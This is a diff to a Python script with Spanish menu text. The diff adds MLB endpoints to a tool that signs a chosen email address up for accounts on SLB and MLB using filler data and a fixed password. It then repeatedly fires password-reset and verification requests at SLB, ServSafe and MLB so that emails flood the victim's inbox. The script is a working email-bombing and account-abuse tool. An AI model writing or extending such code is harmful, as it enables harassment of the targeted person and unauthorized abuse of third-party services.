@@ -32,6 +32,8 @@ def opc():
     print(f"{w}2.Salir")
 
 opc()
+url5 = 'https://profile.mlb.com/api/v1/authn/recovery/password'
+url4 = 'https://profile.mlb.com/api/v1/users?activate=true'
 url2 = "https://api.slb.com/api/auth/password/forgot?emailAddress=" + str("{}".format(correo))+"&emailTemplateId={0DA48535-7880-4670-AC80-8164330B907F}"
 url1 = 'https://api.slb.com/api/auth/register'
 url3 = "https://myprofile-ext.servsafe.com/EmailVerification/SendVerificationCode?Site=servsafe.com&Email=" + str("{}".format(correo)) + "&Language=en-US"
@@ -40,6 +42,8 @@ def register1():
     _json ={"EmailAddress": "{}".format(correo), "Password" : "Nicolas001?", "RegistrationSource" : "Connect", "FirstName" : "asdasdas", "LastName" : "dasdasd", "Affiliation" : "30", "Company" : "asdasd", "JobTitle" : "asdasdasd", "Region" : "AD", "EmailTemplateId" : "{496E231C-DB8B-40FA-B1A6-414429AF33AE}","RegistrationSource" : "SLBCom"}
     _headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0"}
     responseee = requests.post(url1, data=json.dumps(_json), headers= _headers)
+    _json2 = {"profile":{"email":"{}".format(correo),"birthYear":2000,"birthMonth":9,"birthDay":10,"commercialEmailsOptin":str("false")},"credentials":{"password":{"value":"Nicolas001?"}}}
+    responseee2 = requests.post(url4, data=json.dumps(_json2), headers= _headers)
     if responseee.status_code == 200:
         print(f"{v}Correo creado con exito")
     else:
@@ -52,6 +56,9 @@ def enviof1():
     while i <= 5:
         r2 = requests.get(url3)
         r = requests.post(url2)
+        _json3 = {"username":"{}".format(correo),"factorType":"EMAIL","relayState":"https://www.mlb.com"}
+        _headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0"}
+        responseee = requests.post(url5, data=json.dumps(_json3), headers=_headers)
         if r.status_code == 200:
           print(f"{v}Correo {i} de 5 enviado con exito")
         else:
